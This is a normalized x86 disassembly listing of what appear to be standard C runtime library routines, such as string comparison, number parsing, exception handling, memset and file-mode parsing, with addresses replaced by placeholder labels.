je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_42b1e7
push [ rw-data ]
call sub_42a431
push [ rw-data ]
mov [ rw-data ] eax
call sub_42a431
push [ rw-data ]
mov [ rw-data ] eax
call sub_42a431
push [ rw-data ]
mov [ rw-data ] eax
call sub_42a431
add esp 0x10
mov [ rw-data ] eax
call sub_42e13c
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_42a74f
push [ rw-data ]
call sub_42a4ac
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_42894a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_42a4ac
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_42a5d5
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_42aa80
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_42aae1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_425eb1
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_425eb1
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423d36
add esp 0x14
mov eax esi
jmp r-xdata
sub_42ab49
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_423619
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_425eb1
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_42d5e8
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_425eb1
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_42ad78
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_42ab49
add esp 0x14
pop ebp
retn
sub_42adb0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_42adf0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42ae40
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_42b400
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_42adb0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_42adf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42aefd
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_42af2d
mov edi edi
push ebp
mov ebp esp
call sub_42c6ea
push [ ebp + 0x8 ]
call sub_42c53f
push [ rw-data ]
call sub_42a4ac
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_42af56
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_42afab
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_42afc8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_42afec
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_434592
push r--data
push r--data
call sub_42afc8
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_42ae40
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_4307bf
call sub_424852
mov eax r--data
mov [ esp ] r--data
call sub_42afab
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_42ae40
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_42b071
push 0x18
push r--data
call sub_42b398
push 0x8
call sub_42e2b8
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b188
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_42b3dd
retn
mov [ rw-data ] ebx
push 0x8
call sub_42e1de
pop ecx
push [ ebp + 0x8 ]
call sub_42af81
push r--data
mov eax r--data
call sub_42afab
pop ecx
push [ rw-data ]
call sub_42a4ac
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_42afab
pop ecx
push [ rw-data ]
call sub_42a4ac
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_42a4a3
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_42a4ac
mov edi eax
call sub_42a4a3
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_42a4ac
mov edi eax
push [ rw-data ]
call sub_42a4ac
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_42b1e7
mov edi edi
push esi
call sub_42a4a3
mov esi eax
push esi
call sub_42e032
push esi
call sub_435747
push esi
call sub_423bff
push esi
call sub_42c8a2
push esi
call sub_435738
push esi
call sub_430ac8
push esi
call sub_42b235
push esi
call sub_42ef51
push sub_42b1b3
call sub_42a431
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_42b236
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_42a6bc
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_42b398
push sub_42b400
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_42b400
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4234de
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4234de
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_42bd0c
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_42bcc2
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4234de
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4234de
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_42bcf2
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_42bd0c
mov eax [ ebp + 0xc ]
push r--data
call sub_42ae40
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4234de
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_42bcd9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4234de
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_42b5a0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_43580d
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_42b620
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_42894a
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_42894a
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_42b6f1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_42e2b8
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_42b732
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_42e2b8
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_42b764
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_42e1de
pop ecx
pop ebp
retn
sub_42b7a0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_42e1de
pop ecx
pop ebp
retn
sub_42b7cf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edx [ ecx + 0x7f ]
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
cmp al bl
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_436127
add esp 0x14
test eax eax
je r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_4364f6
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_436372
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x8
push r--data
push esi
call sub_436372
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push 0x7
push r--data
push esi
call sub_436372
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
sub_42ba98
push 0x10
push r--data
call sub_42b398
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42bbc7
mov eax edi
call sub_42b3dd
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_428905
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_435756
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_424869
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
